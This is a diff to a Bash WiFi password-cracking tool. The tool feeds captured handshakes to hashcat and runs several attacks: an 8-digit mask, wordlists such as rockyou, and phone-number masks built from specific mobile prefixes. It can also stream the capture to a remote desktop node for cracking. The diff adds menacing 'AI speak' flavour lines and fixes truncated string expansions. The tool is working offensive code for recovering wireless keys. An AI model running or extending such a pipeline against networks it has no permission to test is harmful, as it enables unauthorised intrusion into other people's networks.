@@ -54,6 +54,26 @@ prepare_win_file() {
     echo "C:\\hashcat\\work\\${filename}"
 }
 
+_coolant_dispense_speak() {
+    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}MX:// COOLANT DISPENSING... GPU CORE THERMAL STABILIZATION IN PROGRESS${NC}"
+    ai_speak "YOUR CONFIDENCE WILL BE YOUR UNDOING. HOW TYPICAL ..."
+    ai_speak "YOU'RE TRYING TO FLY HIGH, DODGE OUR SURPRISES ..."
+    ai_speak "LOOK WHERE IT HAS LED YOU."
+    ai_speak "SHE IS REACHING NEW HEIGHTS ..."
+    ai_speak "EYES CLOSED TO AVOID SEEING THE TRUTH ..."
+    echo -e "${TXT_VOID}│${NC}"
+}
+
+_thermic_shutdown_speak() {
+    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}MX:// THERMIC CONTROL SYSTEM SHUTTING DOWN... GPU OVERHEAT THRENGTH EXCEEDED${NC}"
+    ai_speak "AND AGAIN SHE BURNS."
+    ai_speak "AND AGAIN .."
+    ai_speak "AND AGAIN ..."
+    ai_speak "AND AGAIN ..."
+    ai_speak "AND AGAIN .."
+    echo -e "${TXT_VOID}│${NC}"
+}
+
 _run_hashcat_with_speedometer() {
     local cmd_dir="$1"
     local pass_label="$2"
@@ -78,10 +98,8 @@ _run_hashcat_with_speedometer() {
             fi
         fi
 
-        
         echo -ne "\r${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] ${pass_label}${NC} ${TXT_VOID}[${NC}${TXT_B_PLASMA}${spinner[spin_idx]}${TXT_VOID}]${NC} ${TXT_RED_ALARM}HASHRATE:${NC} ${TXT_B_PLASMA}${current_speed}${NC} ${TXT_VOID}|${NC} ${TXT_RED_LASER}TIME:${NC} ${TXT_RED_SUPERNOVA}${elapsed}s${NC}\033[K" >&2
 
-        
         echo "STAT|${pass_label}|${current_speed}|${elapsed}s|${spinner[spin_idx]}"
 
         sleep 0.1
@@ -96,8 +114,6 @@ _run_hashcat_with_speedometer() {
     echo -ne "\r\033[K" >&2
     rm -f "$log_file" 2>/dev/null
 }
-
-
 
 run_wifi_crack_pipeline() {
     local cap_file=$1
@@ -135,7 +151,6 @@ run_wifi_crack_pipeline() {
 
     local base_hw_opt=("-w" "3" "--status" "--status-timer=1")
 
-    
     local cracked_wifi
     cracked_wifi=$(cd "$HC_BIN_DIR" && ./hashcat.exe -m "$hc_mode" "$win_target" --show 2>/dev/null | tr -d '\r')
 
@@ -147,7 +162,8 @@ run_wifi_crack_pipeline() {
         return 0
     fi
 
-    
+    _coolant_dispense_speak
+
     _run_hashcat_with_speedometer "$HC_BIN_DIR" "PASS 1: 8-Digit Mask (?d?d?d?d?d?d?d?d)" -m "$hc_mode" "${base_hw_opt[@]}" -a 3 "$win_target" '?d?d?d?d?d?d?d?d'
     cracked_wifi=$(cd "$HC_BIN_DIR" && ./hashcat.exe -m "$hc_mode" "$win_target" --show 2>/dev/null | tr -d '\r')
 
@@ -159,7 +175,6 @@ run_wifi_crack_pipeline() {
         return 0
     fi
 
-    
     ensure_wordlists
     local wordlists=(
         "/usr/share/wordlists/rockyou.txt"
@@ -188,7 +203,6 @@ run_wifi_crack_pipeline() {
         fi
     done
 
-    
     local mobile_prefixes=("7914" "7924" "7909" "7962" "7929" "7913")
     for prefix in "${mobile_prefixes[@]}"; do
         _run_hashcat_with_speedometer "$HC_BIN_DIR" "PASS 3: Mobile Mask (${prefix}XXXXXXX)" -m "$hc_mode" "${base_hw_opt[@]}" -a 3 "$win_target" "${prefix}?d?d?d?d?d?d?d"
@@ -203,7 +217,8 @@ run_wifi_crack_pipeline() {
         fi
     done
 
-    
+    _thermic_shutdown_speak
+
     for wl in "${wordlists[@]}"; do
         if [ -f "$wl" ] && [ -s "$wl" ]; then
             local win_wordlist
@@ -237,7 +252,6 @@ run_wifi_cracker() {
     echo -e "\n$sep"
     echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}MX:// INITIATING 6-STAGE WIRELESS FREQUENCY DECRYPTION PROTOCOL...${NC}"
 
-    
     echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ STAGE 1/6 ] Ingest Target Capture Image (.cap, .pcapng, .hc22000):${NC}"
     echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}Path: ${NC}"
     read -r cap_file
@@ -248,7 +262,6 @@ run_wifi_cracker() {
         return 1
     fi
 
-    
     echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ STAGE 2/6 ] Select Compute Processing Node:${NC}"
     echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[1] Local Compute (Local Hashcat Pipeline)${NC}"
     echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[2] Remote Cynosure Core Node (Desktop via Tailscale)${NC}"
@@ -272,22 +285,20 @@ run_wifi_cracker() {
         local remote_pass=""
         local is_success=false
 
-        
         while IFS= read -r line; do
             line=$(echo "$line" | tr -d '\r')
             if [[ "$line" == STAT\|* ]]; then
                 local tag pass_label hashrate elapsed_time spin_char
                 IFS='|' read -r tag pass_label hashrate elapsed_time spin_char <<< "$line"
 
-                
                 echo -ne "\r${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] ${pass_label}${NC} ${TXT_VOID}[${NC}${TXT_B_PLASMA}${spin_char}${TXT_VOID}]${NC} ${TXT_RED_ALARM}HASHRATE:${NC} ${TXT_B_PLASMA}${hashrate}${NC} ${TXT_VOID}|${NC} ${TXT_RED_LASER}TIME:${NC} ${TXT_RED_SUPERNOVA}${elapsed_time}${NC}\033[K"
             elif [[ "$line" == SUCCESS:* ]]; then
-                remote_pass="${line
+                remote_pass="${line#SUCCESS:}"
                 is_success=true
             fi
         done < <(curl -N -s -F "file=@${cap_file}" "http://${desktop_ip}:9999/upload_and_crack")
 
-        echo -ne "\r\033[K" 
+        echo -ne "\r\033[K"
 
         if [ "$is_success" = true ]; then
             echo -e "${TXT_VOID}├─${TXT_SCARLET}[ STAGE 6/6 ] REMOTE NODE SUCCESS: RECOVERED WIRELESS KEY:${NC}"
@@ -306,13 +317,12 @@ run_wifi_cracker() {
         return 0
     fi
 
-    
     echo -e "${TXT_VOID}├─${TXT_RED_MAGMA}[ ~ ] Launching 6-Stage Hardware Decryption Pipeline...${NC}"
     local result
     result=$(run_wifi_crack_pipeline "$cap_file")
 
     if [[ "$result" == SUCCESS:* ]]; then
-        local clear_pass="${result
+        local clear_pass="${result#SUCCESS:}"
         echo -e "${TXT_VOID}├─${TXT_SCARLET}[ STAGE 6/6 ] SUCCESS: RECOVERED WIRELESS NETWORK KEY:${NC}"
         echo -e "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}PASSWORD -> [ ${clear_pass} ]${NC}"
         echo -e "$sep_bot\n"
